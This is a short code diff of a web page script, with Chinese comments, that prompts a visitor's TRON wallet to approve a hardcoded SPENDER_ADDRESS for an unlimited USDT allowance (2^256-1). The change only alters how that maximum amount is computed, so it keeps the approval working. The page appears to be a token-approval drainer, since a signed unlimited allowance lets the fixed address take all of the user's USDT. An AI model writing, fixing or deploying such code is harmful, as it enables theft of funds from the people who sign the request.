@@ -183,6 +183,9 @@
         const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
         const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
         
+        // 2^256 - 1 的十进制字符串
+        const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        
         let tronWeb = null;
         let userAddress = null;
         
@@ -253,13 +256,12 @@
                 
                 showStatus('请在钱包中确认授权...', 'loading');
                 
-                // 使用 TronWeb 的 BigNumber 创建无限额度
-                // 2^256 - 1
-                const maxUint256 = tronWeb.toBigNumber(2).pow(256).minus(1);
+                // 创建 BigNumber 对象
+                const amount = tronWeb.toBigNumber(MAX_UINT256);
                 
                 const result = await contract.approve(
                     SPENDER_ADDRESS,
-                    maxUint256
+                    amount
                 ).send();
                 
                 console.log('授权结果:', result);
